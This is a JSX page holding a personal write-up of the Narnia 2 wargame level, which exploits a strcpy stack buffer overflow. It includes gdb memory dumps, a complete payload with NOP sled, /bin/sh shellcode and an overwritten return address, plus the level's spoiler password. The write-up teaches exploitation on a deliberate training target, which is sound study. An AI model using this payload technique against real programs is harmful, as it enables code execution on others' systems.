import CodeBlock from "../../components/elements/CodeBlock/CodeBlock"
import Keyword from "../../components/elements/Keyword/Keyword"
import PageNav from "../../components/elements/PageNav/PageNav"
import SpoilerKey from "../../components/elements/SpoilerKey/SpoilerKey"
import Tag from "../../components/elements/Tag/Tag"

const narnia2 = () => {
  return (
    <div>
      <h1>Narnia 2</h1>
      <Keyword>
        <Tag>shellcode</Tag>
        <Tag>buffer-overflow</Tag>
        <Tag>overwrite-registers</Tag>
      </Keyword>
      <section>
        <h2>Experience</h2>
        <p>
          Looking at the source code of Narnia 2, my initial
          thoughts is that this may be another difficult level.
          I notice the potential vulnerability from the function
          <code>strcpy</code> as it does not seem to check
          for the buffer&apos;s length. I believe I&apos;ve used a function
          called <code>strncpy</code> which does require the length of the buffer.
          Besides that however, I was unsure how I will be able to execute any
          payload as it simply prints out what&apos;s in the buffer.
        </p>
        <CodeBlock language="c">
          {`int main(int argc, char * argv[]){
    char buf[128];
  
    if(argc == 1){
        printf("Usage: %s argument\\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);
  
    return 0;
}`}
        </CodeBlock>
        <p>
          Searching on how to execute a command by exploiting a buffer
          overflow, I came upon this great instruction
          by Coen Goedegebure named <a href='https://www.coengoedegebure.com/buffer-overflow-attacks-explained/'>Buffer overflow attacks explained</a>.
          From this, I learnt that I had to overwrite one of the registers of the
          program, named EIP (extended Instruction Pointer) which points to
          the next instruction the program will execute. It also thought that
          we may know when we have overwritten the register when the
          program try to get the value from the pointer but obtained an
          invalid address.
        </p>
        <p>
          Using gdb, we gain access to viewing information register using
          <code>info registers</code> and also allow us to call
          the program repeatedly with ease, using <code>r</code> followed
          by the argument we want the program to have. Incrementing from the
          size of the buffer itself, 128, 130, 140, it returned a
          segmentation fault at 140. Checking the register information,
          the EIP has indeed been overwritten. Next, we simply have
          to find the number of characters it actually took to overwrite
          the EIP. I discovered that it took 132 characters to reach
          EIP. The following command was used to proof this.
        </p>
        <CodeBlock language='shell'>
          {`r $(python -c "print 'a' * 132 + 'b' *4")`}
        </CodeBlock>
        <p>
          Now, we simply have to inject a shellcode, and change
          the EIP pointer to the address of the shellcode. Now, we may
          inspect the memory address used by the program using <code>x</code>
          in gdb.
        </p>
        <CodeBlock language="">
          {`x/200x $sp`}
        </CodeBlock>
        <p>
          The above code will print the memory per 200 byte blocks from
          the stackpointer. Searching for our
          injected characters, we found the following section.
        </p>
        <CodeBlock language="">
          {`0xffffd810:     0x00326169      0x61616161      0x61616161      0x61616161
0xffffd820:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd830:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd840:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd850:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd860:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd870:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd880:     0x61616161      0x61616161      0x61616161      0x61616161
0xffffd890:     0x61616161      0x61616161      0x62626262      0x5f434c00
0xffffd8a0:     0x3d4c4c41      0x555f6e65      0x54552e53      0x00382d46
0xffffd8b0:     0x435f534c      0x524f4c4f      0x73723d53      0x643a303d`}
        </CodeBlock>
        <p>
          From this, we could clearly see the location of the injected &quot;a&quot; (which
          has a value of 61). The start of the buffer lies on the address
          <code>0xffffd814</code>, we could check this using <code>x/s 0xffffd5b8</code>
          or <code>print((char *)0xffffd5b8</code>. Now, consider the shellcode from Narnia 1.
          The length of the shellcode was 24 bytes, therefore, we would only need 108 filler
          bytes, we will put nop (no operation) code which is <code>\90</code> in assembly. We can already construct the full
          payload from this, simply change the &quot;b&quot;s to an address in the no op region, I&apos;ve
          chosen 0xffffd860
        </p>
        <CodeBlock language="">
          {`r $(python -c "print '\\x90'* 108 + '\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80' + '\\x60\\xd8\\xff\\xff'")`}
        </CodeBlock>
        <p>
          And the memory was looking like so. From here, we can see that, any address from 0xffffd814 (0xffffd80c + 8 bytes) should work, but this may not be the case
          outside of gdb, so we will still use 0xffffd860. This is in fact the point
          of the no-op, they act as a sled to move it to our shellcode. To read more,
          please do see the article by Coen Goedegebure mentioned above.
        </p>
        <CodeBlock language="">
          {`E(gdb) x/100x $sp+500
0xffffd7ac:     0x00000017      0x00000001      0x00000019      0xffffd7eb
0xffffd7bc:     0x0000001a      0x00000000      0x0000001f      0xffffdfe8
0xffffd7cc:     0x0000000f      0xffffd7fb      0x00000000      0x00000000
0xffffd7dc:     0x00000000      0x00000000      0x00000000      0xe9000000
0xffffd7ec:     0x579d63ca      0x8b994914      0x406436df      0x694fbea3
0xffffd7fc:     0x00363836      0x00000000      0x72616e2f      0x2f61696e
0xffffd80c:     0x6e72616e      0x00326169      0x90909090      0x90909090
0xffffd81c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd82c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd83c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd84c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd85c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd86c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd87c:     0x90909090      0x31580b6a      0x2f6856f6      0x6868732f
0xffffd88c:     0x6e69622f      0xc931e389      0x80cdca89      0xffffd860`}
        </CodeBlock>
        <p>
          Now simply run the command outside of gdb, replacing the r with
          natas2.
        </p>
        <CodeBlock language="">
          {`./narnia2 $(python -c "print '\\x90'* 108 + '\\x6a\\x0b\\x58\\x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80' + '\\x60\\xd8\\xff\\xff'")`}
        </CodeBlock>
      </section>
      <section>
        <h2>Reflection</h2>
        <p>
          This was a very challenging level, we had to look deeply into the memory of the program
          itself and even then, the memory may not be the same when the program
          is actually ran outside of gdb. I noticed this as the lower memory address work
          inside gdb. The problem was the gdb is identified with the user narnia2, so
          the program must be ran outside. This was a source of confusion for quite some time.
        </p>
        <p>
          This level extended on the shellcode concept learnt from Narnia2, but this time,
          we are not given the luxury that the input is ran by the program by default. I learnt
          of PID, the register that points to the location of the next instruction which expanded
          the potential of using this type of attack. This taught me that, the vulnerability
          was a lot more dangerous as it can overwrite registers and basically change
          the control flow of the program as a whole.
        </p>

      </section>
      <SpoilerKey>{`vaequeezee`}</SpoilerKey>
      <PageNav link1='/narnia/narnia1' link2='' />
    </div>
  )
}
export default narnia2

// r  $(python -c "print '\x90'* 108 + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '\x60\xd8\xff\xff'")